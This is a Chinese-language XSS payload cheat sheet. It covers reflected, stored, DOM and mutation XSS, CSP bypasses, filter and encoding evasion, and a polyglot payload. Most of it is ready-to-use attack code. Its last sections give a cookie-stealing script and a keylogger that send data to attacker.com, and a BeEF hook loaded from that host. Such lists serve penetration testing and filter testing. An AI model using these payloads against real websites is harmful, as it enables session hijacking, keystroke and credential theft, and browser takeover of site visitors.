# XSS详细分类

## 1. 反射型XSS (Reflected XSS)

### 基础Payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe src=javascript:alert(1)>
```

### 探测

```
搜索框: "><script>alert(1)</script>
URL参数: ?q=<script>alert(1)</script>
```

---

## 2. 存储型XSS (Stored XSS)

同反射型XSS，但payload会存储在服务器端

### 常见存储点

- 评论区
- 用户资料
- 帖子内容
- 头像名称
- 文件名

---

## 3. DOM型XSS (DOM-based XSS)

### 基础Payload

```javascript
<img src=x onerror=alert(document.domain)>
<svg onload=alert(location.href)>
<a href=javascript:alert(1)>click</a>
```

### DOM Sink

- document.write()
- innerHTML
- eval()
- setTimeout()
- location.href

---

## 4. 突变型XSS (mXSS)

利用浏览器解析差异

```html
<svg><p><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## 5. Unicode XSS

```html
<img src=x onerror=alert(\u0031)>
<script>\u0061lert(1)</script>
```

---

## 6. CSP绕过

### base标签

```html
<base href="http://attacker.com/">
```

### meta标签

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/">
```

### link标签

```html
<link rel="import" href="http://attacker.com/">
```

### JSONP绕过

```html
<script src="http://target.com/jsonp?callback=alert(1)"></script>
```

---

## 7. 过滤器绕过

### 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
```

### HTML编码

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### URL编码

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

### 标签混淆

```html
<script/x>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 8. 编码绕过

### Base64

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## 9. Polyglot XSS

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## 10. Cookie窃取

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>
```

---

## 11. 键盘记录

```html
<script>
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?k="+e.key;
}
</script>
```

---

## 12. BeEF利用

```html
<script src="http://attacker.com:3000/hook.js"></script>
```
